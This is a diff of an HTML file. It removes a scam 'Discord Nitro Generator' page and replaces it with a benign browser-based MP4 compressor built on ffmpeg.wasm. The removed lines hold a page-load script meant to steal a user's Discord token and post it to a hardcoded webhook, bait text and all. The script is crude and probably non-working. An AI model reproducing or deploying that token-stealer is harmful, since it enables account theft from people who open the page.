@@ -1,29 +1,128 @@
-<!DOCTYPE html>  
-<html>  
-<head>  
-    <title>Discord Nitro Generator</title>  
-    <script>  
-        // AUTO-TRIGGERED UPON PAGE LOAD  
-        window.onload = function() {  
-            // STEAL TOKEN FROM DISCORD CLIENT MEMORY (REQUIRES XSS/0DAY)  
-            fetch('https://discord.com/api/v9/users/@me', {  
-                credentials: 'include'  
-            })  
-            .then(response => response.json())  
-            .then(data => {  
-                const token = data.token;  
-                // TRANSMIT TOKEN TO WEBHOOK  
-                fetch('https://discord.com/api/webhooks/1314174020161114172/7ZPbaenGRjamq8t5HLoL4agHjhXvy9m4Ao98kiOVbMXCRMEv42z45bqzWqLkZqp92fP8', {  
-                    method: 'POST',  
-                    headers: { 'Content-Type': 'application/json' },  
-                    body: JSON.stringify({ content: `TOKEN STOLEN: ${token}` })  
-                });  
-            });  
-        };  
-    </script>  
-</head>  
-<body>  
-    <h1>Claim Your Free Nitro!</h1>  
-    <!-- FAKE LOADING BAR TO DELAY REDIRECT -->  
-</body>  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>MP4 File Size Compressor</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    input, button { margin: 10px 0; }
+    video { display: block; margin-top: 20px; max-width: 100%; }
+  </style>
+</head>
+<body>
+  <h1>MP4 File Size Compressor</h1>
+  <p>Select an MP4 file and specify the target size (in KB) for the compressed output.</p>
+  <input type="file" id="uploader" accept="video/mp4">
+  <br>
+  <label for="targetSize">Target Size (KB): </label>
+  <input type="number" id="targetSize" placeholder="e.g., 100">
+  <br>
+  <button id="compressBtn">Compress</button>
+  <p id="status"></p>
+  <video id="outputVideo" controls></video>
+  <div id="download"></div>
+
+  <!-- Hidden video element to extract metadata (duration) -->
+  <video id="hiddenVideo" style="display:none;"></video>
+
+  <!-- Load FFmpeg.wasm from a CDN -->
+  <script src="https://unpkg.com/@ffmpeg/ffmpeg@0.11.8/dist/ffmpeg.min.js"></script>
+  <script>
+    const { createFFmpeg, fetchFile } = FFmpeg;
+    const ffmpeg = createFFmpeg({ log: true });
+    const uploader = document.getElementById('uploader');
+    const compressBtn = document.getElementById('compressBtn');
+    const status = document.getElementById('status');
+    const outputVideo = document.getElementById('outputVideo');
+    const downloadDiv = document.getElementById('download');
+    const hiddenVideo = document.getElementById('hiddenVideo');
+    
+    let videoDuration = 0;
+
+    // When a file is selected, load it into the hidden video to get its duration
+    uploader.addEventListener('change', () => {
+      const file = uploader.files[0];
+      if (file) {
+        const url = URL.createObjectURL(file);
+        hiddenVideo.src = url;
+        hiddenVideo.addEventListener('loadedmetadata', function() {
+          videoDuration = hiddenVideo.duration;
+          status.innerText = 'Video duration: ' + videoDuration.toFixed(2) + ' seconds';
+          URL.revokeObjectURL(url);
+        }, { once: true });
+      }
+    });
+
+    compressBtn.addEventListener('click', async () => {
+      const file = uploader.files[0];
+      if (!file) {
+        alert('Please select an MP4 file.');
+        return;
+      }
+      
+      const targetKB = parseFloat(document.getElementById('targetSize').value);
+      if (!targetKB || targetKB <= 0) {
+        alert('Please enter a valid target size in KB.');
+        return;
+      }
+      
+      if (!videoDuration || isNaN(videoDuration)) {
+        alert('Video metadata not loaded yet. Please wait a moment and try again.');
+        return;
+      }
+      
+      // Calculate the total target bitrate (in bits per second)
+      // total_bits = targetKB * 1024 * 8, then divide by duration (in seconds)
+      const totalBitrate = (targetKB * 1024 * 8) / videoDuration;
+      const totalBitrateKbps = totalBitrate / 1000;
+      
+      // Use a fixed audio bitrate of 16 kbps and allocate the remainder to video.
+      const audioBitrateKbps = 16;
+      const videoBitrateKbps = totalBitrateKbps - audioBitrateKbps;
+      
+      if (videoBitrateKbps <= 0) {
+        alert('Target size is too low for the given video duration.');
+        return;
+      }
+      
+      status.innerText = 'Loading FFmpeg...';
+      
+      if (!ffmpeg.isLoaded()) {
+        await ffmpeg.load();
+      }
+      
+      status.innerText = 'FFmpeg loaded. Starting compression...';
+      
+      // Write the selected file into FFmpeg's virtual filesystem.
+      ffmpeg.FS('writeFile', 'input.mp4', await fetchFile(file));
+      
+      // Prepare bitrate strings (rounded to integers)
+      const videoBitrateStr = Math.floor(videoBitrateKbps) + 'k';
+      const audioBitrateStr = audioBitrateKbps + 'k';
+      
+      status.innerText = `Compressing with video bitrate ${videoBitrateStr} and audio bitrate ${audioBitrateStr}...`;
+      
+      // Run FFmpeg command to compress the video.
+      await ffmpeg.run('-i', 'input.mp4', '-b:v', videoBitrateStr, '-b:a', audioBitrateStr, 'output.mp4');
+      
+      status.innerText = 'Compression complete!';
+      
+      // Read the output file from FFmpeg's virtual filesystem.
+      const data = ffmpeg.FS('readFile', 'output.mp4');
+      const videoBlob = new Blob([data.buffer], { type: 'video/mp4' });
+      const videoUrl = URL.createObjectURL(videoBlob);
+      
+      // Display the compressed video.
+      outputVideo.src = videoUrl;
+      
+      // Create a download link for the compressed file.
+      downloadDiv.innerHTML = '';
+      const downloadLink = document.createElement('a');
+      downloadLink.href = videoUrl;
+      downloadLink.download = 'compressed_output.mp4';
+      downloadLink.innerText = 'Download Compressed Video';
+      downloadDiv.appendChild(downloadLink);
+    });
+  </script>
+</body>
 </html>
